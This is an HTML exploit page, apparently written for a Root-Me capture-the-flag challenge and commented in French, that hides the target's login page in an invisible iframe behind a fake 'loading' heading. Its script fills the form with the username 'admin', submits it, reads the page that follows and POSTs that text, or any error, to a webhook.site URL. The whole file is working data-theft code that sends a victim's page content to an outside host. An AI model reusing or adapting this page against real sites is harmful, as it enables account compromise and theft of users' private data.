<!DOCTYPE html>
<html>
<head>
  <title>SOME Exploit</title>
</head>
<body>
  <h1>Chargement en cours…</h1>

  <!-- Iframe cachée -->
  <iframe id="step1" src="http://challenge01.root-me.org:58010/login" style="display:none;"></iframe>

  <script>
    const webhook = "https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b"; // 🔁 Mets ton propre URL

    function wait(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function steal() {
      const frame = document.getElementById("step1");

      try {
        const doc = frame.contentWindow.document;

        // Remplir et soumettre le formulaire de login
        doc.querySelector("#username").value = "admin";
        doc.querySelector("#secret").value = "inutilise";
        doc.querySelector("form").submit();

        // Attendre la redirection après login (vers /profile ou /settings)
        await wait(1500);

        // Lire le contenu visible (body.innerText)
        const pageText = frame.contentWindow.document.body.innerText;

        // Envoyer au webhook
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ dump: pageText })
        });

      } catch (err) {
        // En cas d’erreur (ex: cross-origin)
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ error: err.toString() })
        });
      }
    }

    // Lancer quand l’iframe a chargé
    document.getElementById("step1").onload = steal;
  </script>
</body>
</html>
